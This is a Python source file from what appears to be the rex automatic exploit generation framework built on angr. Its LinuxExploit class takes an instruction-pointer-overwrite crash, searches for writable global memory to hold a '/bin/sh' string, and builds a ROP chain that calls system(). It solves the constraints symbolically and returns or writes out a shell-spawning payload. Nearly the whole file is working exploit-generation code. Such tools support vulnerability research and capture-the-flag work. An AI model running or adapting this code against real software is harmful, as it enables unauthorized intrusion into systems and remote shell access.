import os
import angr

from rex import Vulnerability
from rex.exploit import Exploit, CannotExploit

import logging
l = logging.getLogger("rex.exploit.linux.LinuxExploit")

class LinuxExploit(Exploit):
    '''
    Exploit object which can leak flags or set registers
    '''

    COMMANDS = ["/bin/sh\x00", "/bin/sh#", "/bin/sh;"]

    def __init__(self, crash, use_rop_cache=True, rop_cache_file=None):
        '''
        :param crash: an exploitable crash object
        :param use_rop_cache: should rop gadgets be cached?
        :param rop_cache_file: which filename to use for a rop cache
        '''
        super(LinuxExploit, self).__init__(crash, use_rop_cache, rop_cache_file)

        self.shell = None

    def initialize(self):

        super(LinuxExploit, self).initialize()

        self._generate_shell()

    def drop_shell(self, filename=None):
        '''
        :return: a payload which will spawn an interactive shell
        '''

        if self.shell is None:
            return None

        if filename is not None:
            with open(filename, "wb") as f:
                f.write(self.shell)
        return self.shell

    def any_control(self):
        '''
        does this exploit offer anything?
        '''

        return self.shell is not None

### EXPLOIT GENERATORS

    def _generate_shell(self):
        '''
        generate and set the shell dropper
        '''

        try:
            self.shell = self._generate_a_shell()
        except CannotExploit as e:
            l.warning("cannot generate a shell dropper exploit, %s", e.message)

    def _generate_a_shell(self):

        if self.crash.crash_type == Vulnerability.IP_OVERWRITE or \
                self.crash.crash_type == Vulnerability.PARTIAL_IP_OVERWRITE:
            return self._ip_overwrite_rop_shell()
        else:
            raise CannotExploit("exploitation of this vulnerability is unimplemented")

    def _ip_overwrite_rop_shell(self):

        # generate a chain which drops a shell
        # methods:
        #    * call a command executing function already in the binary (system, execve)
        #    * execute shellcode if the stack is executable

        # if system exists in the binary we need a chain to call it and a controlled string
        # at a global address
        if "system" in self._p.loader.main_bin.plt:
            try:
                return self._rop_to_call_system()
            except CannotExploit:
                l.warning("system found in binary, but was unable to call it")
        if "execve" in self._p.loader.main_bin.plt:
            pass

        raise CannotExploit("could not find command execution function in binary")

    def _rop_to_call_system(self):
        cmd_tuple = self._write_command()

        if cmd_tuple is None:
            raise CannotExploit("cannot write command string into binary")

        cmd_str_addr, cmd_str_constraint = cmd_tuple

        chain = self.rop_engine.func_call("system", [cmd_str_addr])

        return self._rop_to_call_function(chain, cmd_str_constraint)

    def _rop_to_call_function(self, chain, extra_constraints):

        # see if there's a global address we can place our string to "/bin/sh"

        st, chain_addr, offered_size = self._eip_overwrite_with_chain(chain)

        st.add_constraints(extra_constraints)
        st.add_constraints(st.memory.load(chain_addr, chain.payload_len) == self.state.BVV(chain.payload_str()))

        if not st.satisfiable():
            raise CannotExploit("generated unsatisfiable exploit")

        return st.posix.dumps(0)

    def _write_command(self):
        '''
        write a command into memory
        :return: tuple of the address of the string and the constraint which adds the string
        '''

        glob_control = self._global_control()

        # try all variations of commands at every global address
        for cmd in LinuxExploit.COMMANDS:
            for base in glob_control:
                for addr in range(base, base+glob_control[base]):
                    constraint = self.state.memory.load(addr, len(cmd)) == self.state.BVV(cmd)
                    if self.state.se.satisfiable(extra_constraints=(constraint,)):
                        cmd_str_addr = addr
                        cmd_str_addr_constraint = constraint
                        return (cmd_str_addr, cmd_str_addr_constraint)

        return None
